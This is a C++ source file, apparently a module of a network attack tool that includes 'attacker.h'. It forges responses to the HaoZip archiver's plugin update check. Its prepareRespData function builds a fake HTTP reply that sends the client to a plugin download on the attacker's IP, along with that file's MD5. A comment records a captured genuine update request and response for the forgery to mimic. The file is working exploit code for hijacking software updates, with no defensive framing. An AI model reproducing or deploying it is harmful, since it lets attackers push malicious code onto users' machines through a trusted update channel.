

#include "haozip.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "..\\SdkVersion.h"
#include "../HttpUtils.h"

using namespace std;


string Haozip::getTypeName() {
	return "haozip";
}







int Haozip::prepareRespData(unsigned long ulIP, string filepath, string filename) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: text/html; charset=gbk\r\nVary: Accept-Encoding\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	//issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernel/kernel.20013.gz
	char * lpRespContentFormat =
		"Plugin\n"
		"Author\n"
		"Description\n"
		"http ://%s/%s\n"
		"999999999\n"
		"10240\n"
		"%s\n"
		"0\n"
		"936\n"
		"9400\n";


	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, szip.c_str(),filename.c_str(),m_szmd5);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}



/*
POST /plugin.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: update.haozip.2345.com
Content-Length: 41
Cache-Control: no-cache

v=10907&s=1.0.0.1&t=RAR&a=0&c=936&r=17490
HTTP/1.1 200 OK
Date: Sun, 24 Feb 2019 05:46:34 GMT
Server: Apache
Cache-Control: max-age=0
Expires: Sun, 24 Feb 2019 05:46:34 GMT
Vary: Accept-Encoding
Content-Length: 131
Connection: close
Content-Type: text/html; charset=gbk

Plugin
Author
Description
http://download.haozip.com/plugin/plugin.zip
999999999
10240
BB7F1E843C7383B9A015311A2DBFBD35
0
936
9400
*/


